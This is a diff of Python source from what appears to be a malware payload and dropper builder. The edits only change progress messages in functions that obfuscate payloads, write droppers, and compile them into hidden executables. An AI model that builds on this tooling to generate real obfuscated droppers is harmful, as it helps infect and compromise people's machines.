@@ -192,7 +192,7 @@ def _update(input, output, task=None):
 def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
-    util.display("\tAdding modules...", color='reset', style='normal', end=',')
+    util.display("\tAdding modules... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
     modules = ['core/loader.py','core/util.py','core/security.py','core/payloads.py']
@@ -275,7 +275,7 @@ def _payload(options, **kwargs):
 
     if options.obfuscate:
         __load__= threading.Event()
-        util.display("\tObfuscating payload...", color='reset', style='normal', end=',')
+        util.display("\tObfuscating payload... ", color='reset', style='normal', end=',')
         __spin__= _spinner(__load__)
         output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
         __load__.set()
@@ -391,19 +391,21 @@ def _dropper(options, **kwargs):
         fp.write(dropper)
 
     if options.exe:
-        util.display('    Compiling executable...', color='reset', style='normal', end=',')
+        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
 
     elif options.app:
-        util.display('    Bundling application...', color='reset', style='normal', end=',')
+        util.display('\tBundling application... ', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
 
+    else:
+        util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
     util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
